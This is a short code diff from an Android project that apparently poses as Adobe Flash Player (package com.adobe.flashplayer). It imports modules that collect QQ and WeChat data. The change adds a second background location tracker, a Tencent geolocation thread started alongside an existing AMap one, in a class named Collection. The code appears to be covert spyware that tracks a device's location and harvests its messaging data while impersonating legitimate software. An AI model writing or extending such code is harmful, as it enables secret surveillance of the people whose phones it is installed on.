@@ -17,6 +17,7 @@ import com.adobe.flashplayer.data.Location.MyTencentLocation;
 import com.adobe.flashplayer.data.app.QQ;
 import com.adobe.flashplayer.data.app.WECHAT;
 import com.adobe.flashplayer.install.InstallActivity;
+import com.tencent.map.geolocation.TencentLocation;
 
 
 public class Collection {
@@ -89,6 +90,9 @@ public class Collection {
 
             AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
             new Thread(amap).start();
+
+            MyTencentLocation tecentloc = new MyTencentLocation(context,Public.PHONE_LOCATION_MINSECONDS) ;
+            new Thread(tecentloc).start();
 
             PowerManager pm=(PowerManager)context.getSystemService(Context.POWER_SERVICE);
             boolean isScreenOn =pm.isInteractive();
